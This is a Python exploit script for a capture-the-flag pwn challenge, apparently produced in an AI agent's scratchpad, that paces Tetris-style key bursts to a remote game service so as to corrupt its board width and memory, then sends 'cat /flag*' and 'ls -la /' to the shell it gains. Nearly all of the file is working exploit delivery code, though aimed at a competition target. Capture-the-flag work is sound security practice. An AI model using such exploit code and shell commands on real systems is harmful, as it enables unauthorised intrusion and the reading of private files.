#!/usr/bin/env python3
"""Paced delivery of the plan2 OR-write sequence.

Prefix (pieces 0.. first long write-1) is sent as one burst so the inner
key loop inflates width to 842 before the first 80-col redraw. Each later
~800-byte I-move is sent only after stdout is drained, as one burst, so
gravity cannot drop the I before `w`.
"""
from __future__ import annotations

import os
import re
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from plan2 import build

HOST, PORT = "tcp.flagyard.com", 14450
LOCAL = (
    "/tmp/claude-1000/-home-y-rose-ctf-tfc-ctf-2026-pwn-teto/"
    "f37479c3-d63f-482d-8e2f-6275ca954865/scratchpad/teto24"
)
LONG = 50


def strip_ansi(d: bytes) -> bytes:
    return re.sub(rb"\x1b\[[0-9;?]*[A-Za-z]", b"", d)


class Drain:
    def __init__(self, recv_fn, send_fn):
        self.recv_fn = recv_fn
        self.send_fn = send_fn
        self.buf = bytearray()
        self.dead = False
        self.t = threading.Thread(target=self._run, daemon=True)
        self.t.start()

    def _run(self):
        while not self.dead:
            try:
                c = self.recv_fn()
            except Exception:
                time.sleep(0.02)
                continue
            if c:
                self.buf.extend(c)
            elif c == b"":
                break
            else:
                time.sleep(0.02)

    def snap(self) -> bytes:
        return bytes(self.buf)

    def n80(self) -> int:
        return len(re.findall(rb"\|([.#@]{80})\|", strip_ansi(self.snap())))

    def wait(self, pred, t=6.0) -> bytes:
        end = time.time() + t
        while time.time() < end:
            if pred(self.snap()):
                break
            time.sleep(0.02)
        return self.snap()

    def quiet(self, s=0.12):
        t0 = time.time()
        n = len(self.buf)
        while time.time() - t0 < s:
            if len(self.buf) != n:
                n = len(self.buf)
                t0 = time.time()
            time.sleep(0.02)

    def send(self, data: bytes):
        self.send_fn(data)


def connect(remote: bool):
    if remote:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.setblocking(False)

        def recv():
            try:
                return s.recv(65536)
            except BlockingIOError:
                return None

        def send(d: bytes):
            view = memoryview(d)
            while view:
                try:
                    n = s.send(view)
                    view = view[n:]
                except BlockingIOError:
                    time.sleep(0.01)

        return Drain(recv, send), s

    import fcntl
    import subprocess

    proc = subprocess.Popen(
        [LOCAL],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    fd = proc.stdout.fileno()
    fcntl.fcntl(fd, fcntl.F_SETFL, fcntl.fcntl(fd, fcntl.F_GETFL) | os.O_NONBLOCK)

    def recv():
        try:
            return proc.stdout.read(65536)
        except Exception:
            return None

    def send(d: bytes):
        proc.stdin.write(d)
        proc.stdin.flush()

    return Drain(recv, send), proc


def groups(piece_keys: list[str]) -> list[bytes]:
    """One prefix burst, then each long write (with following shorts)."""
    out = []
    cur = []
    started_long = False
    for k in piece_keys:
        if len(k) > LONG:
            if cur:
                out.append("".join(cur).encode())
                cur = []
            started_long = True
            out.append(k.encode())
        else:
            cur.append(k)
    if cur:
        out.append("".join(cur).encode())
    # Keep top-out keys in the same inner loop as the last I-lock.
    if len(out) >= 2 and len(out[-1]) <= LONG:
        out[-2] = out[-2] + out[-1]
        out.pop()
    return out


def main():
    remote = "--local" not in sys.argv
    payload, g, _ = build()
    chunks = groups(g.piece_keys)
    print(
        f"[*] pieces {len(g.piece_keys)} payload {len(payload)} "
        f"chunks {[(len(c), c[:12]) for c in chunks]} remote={remote}",
        flush=True,
    )
    d, conn = connect(remote)
    d.wait(lambda b: b"|..........|" in b, 5.0)
    print(f"[*] banner {len(d.buf)} bytes", flush=True)
    time.sleep(0.05)

    for i, chunk in enumerate(chunks):
        if i:
            d.quiet(0.15)
        before = d.n80()
        go = b"GAME OVER" in d.snap()
        print(
            f"[*] send[{i}] {len(chunk)} bytes n80={before} GO={go}",
            flush=True,
        )
        if go:
            break
        try:
            d.send(chunk)
        except Exception as e:
            print(f"[!] send failed: {e}", flush=True)
            break
        if i == 0:
            d.wait(lambda b: b"GAME OVER" in b or d.n80() >= 20, t=8.0)
            if d.n80() < 20 and b"GAME OVER" not in d.snap():
                print("[!] prefix did not inflate width; abort", flush=True)
                break
        else:
            n80_before = before
            d.wait(
                lambda b, n=n80_before: b"GAME OVER" in b or d.n80() > n,
                t=3.0,
            )
        print(
            f"    after n80={d.n80()} GO={b'GAME OVER' in d.snap()} buf={len(d.buf)}",
            flush=True,
        )

    d.wait(lambda b: b"GAME OVER" in b, 3.0)
    print(f"[*] GAME OVER={b'GAME OVER' in d.snap()} buf={len(d.buf)}", flush=True)
    time.sleep(0.2)
    try:
        d.send(
            b"\n"
            b"cat /flag* 2>&1\n"
            b"ls -la / 2>&1\n"
            b"echo TETO_DONE\n"
        )
    except Exception as e:
        print(f"[!] shell send failed: {e}", flush=True)
    d.wait(lambda b: b"TETO_DONE" in b or b"BHFlagY" in b, 10.0)
    time.sleep(0.4)
    tail = strip_ansi(d.snap())
    interesting = [
        ln for ln in tail.split(b"\n") if b"|" not in ln and ln.strip()
    ]
    print("---- non-board ----")
    for ln in interesting[-40:]:
        print(ln[:240])
    print("---- tail ----")
    print(tail[-500:])
    d.dead = True
    try:
        if remote:
            conn.close()
        else:
            conn.kill()
    except Exception:
        pass


if __name__ == "__main__":
    main()
